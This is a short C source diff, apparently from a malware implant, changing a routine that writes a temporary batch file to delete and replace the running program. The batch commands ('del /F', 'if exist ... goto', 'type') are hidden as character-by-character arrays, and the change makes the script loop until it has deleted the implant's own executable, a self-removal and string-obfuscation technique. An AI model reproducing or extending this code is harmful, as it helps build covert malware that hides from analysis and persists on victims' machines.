@@ -184,6 +184,8 @@ BOOL CreateReplaceBatch(__in PVTABLE lpTable, __in LPSTR strOldFile, __in LPSTR 
 	BOOL bRet = TRUE;
 	DWORD dwOut;
 
+	LPSTR currentSoldierFileName = GetMySelfName(lpTable);
+
 	CHAR strDotBat[] = { '.', 'b', 'a', 't', 0x0 };
 	LPSTR strBatchName = GetTempFile(lpTable);
 	__STRCAT__(strBatchName, strDotBat);
@@ -192,11 +194,15 @@ BOOL CreateReplaceBatch(__in PVTABLE lpTable, __in LPSTR strOldFile, __in LPSTR 
 
 	CHAR strFormat1[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', 0x0 };
 	__STRCAT__(strBatchBuffer, strFormat1);
-	__STRCAT__(strBatchBuffer, strNewFile); 
+	
+	__STRCAT__(strBatchBuffer, currentSoldierFileName);
+	//__STRCAT__(strBatchBuffer, strNewFile); 
 
 	CHAR strFormat2[] = { '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', 0x0 };
 	__STRCAT__(strBatchBuffer, strFormat2); 
-	__STRCAT__(strBatchBuffer, strNewFile); 
+
+	__STRCAT__(strBatchBuffer, currentSoldierFileName);
+	//__STRCAT__(strBatchBuffer, strNewFile); 
 
 	CHAR strFormat3[] = { '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 't', 'y', 'p', 'e', ' ', '"', 0x0 };
 	__STRCAT__(strBatchBuffer, strFormat3); 
@@ -235,6 +241,8 @@ BOOL CreateReplaceBatch(__in PVTABLE lpTable, __in LPSTR strOldFile, __in LPSTR 
 	}
 
 	lpTable->VirtualFree(strBatchBuffer, 0, MEM_RELEASE);
+
+	//lpTable->VirtualFree(currentSoldierFileName, 0, MEM_RELEASE);
 	return bRet;
 }
 
